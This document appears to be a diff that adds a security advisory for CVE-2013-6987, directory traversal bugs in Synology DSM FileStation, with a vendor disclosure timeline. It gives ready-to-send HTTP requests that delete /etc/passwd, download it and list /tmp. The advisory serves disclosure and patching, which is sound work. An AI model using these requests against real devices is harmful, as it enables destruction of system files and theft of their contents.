@@ -1,0 +1,80 @@
+**************************************************************
+Title: Synology DSM multiple directory traversal
+Version affected: <= 4.3-3810
+Vendor: Synology
+Discovered by: Andrea Fabrizi
+Email: andrea.fabrizi@gmail.com
+Web: http://www.andreafabrizi.it
+Twitter: @andreaf83
+Status: patched
+CVE: 2013-6987
+**************************************************************
+
+I'm again here with a Synology DSM vulnerability.
+
+Synology DiskStation Manager (DSM) it's a Linux based operating
+system, used for the DiskStation and RackStation products.
+
+I found a lot of directory traversal in the FileBrowser components.
+This kind of vulnerability allows any authenticated user, even if not
+administrative, to access, create, delete, modify system and
+configuration files.
+
+The only countermeasure implemented against this vulnerability is the
+check that the path starts with a valid shared folder, so is enough to
+put the "../" straight after, to bypass the security check.
+
+Vulnerables CGIs:
+- /webapi/FileStation/html5_upload.cgi
+- /webapi/FileStation/file_delete.cgi
+- /webapi/FileStation/file_download.cgi
+- /webapi/FileStation/file_sharing.cgi
+- /webapi/FileStation/file_share.cgi
+- /webapi/FileStation/file_MVCP.cgi
+- /webapi/FileStation/file_rename.cgi
+
+Not tested all the CGI, but I guess that many others are vulnerable,
+so don't take my list as comprehensive.
+
+Following some examples ("test" is a valid folder name):
+
+- Delete /etc/passwd
+===========================================
+POST /webapi/FileStation/file_delete.cgi HTTP/1.1
+Host: 192.168.56.101:5000
+X-SYNO-TOKEN: XXXXXXXX
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 103
+Cookie: stay_login=0; id=kjuYI0HvD92m6
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+path=/test/../../etc/passwd&accurate_progress=true&api=SYNO.FileStation.Delete&method=start&version=1
+===========================================
+
+- Arbitrary file download:
+===========================================
+GET /fbdownload/?dlink=2f746573742f2e2e2f2e2e2f6574632f706173737764 HTTP/1.1
+Host: 192.168.56.101:5000
+Connection: keep-alive
+Authorization: Basic XXXXXXXX
+===========================================
+
+2f746573742f2e2e2f2e2e2f6574632f706173737764 -> /test/../../etc/passwd
+
+- Remote file list:
+=========================
+POST /webapi/FileStation/file_share.cgi HTTP/1.1
+Host: 192.168.56.101:5000
+X-SYNO-TOKEN: XXXXXXXX
+Content-Length: 75
+Cookie: stay_login=0; id=f9EThJSyRaqJM; BCSI-CS-36db57a1c38ce2f6=2
+
+folder_path=/test/../../tmp&api=SYNO.FileStation.List&method=list&version=1
+==========================
+
+Timeline:
+- 05/12/2013: First contact with the vendor
+- 06/12/2013: Vulnerability details sent to the vendor
+- 20/12/2013: Patch released by the vendor
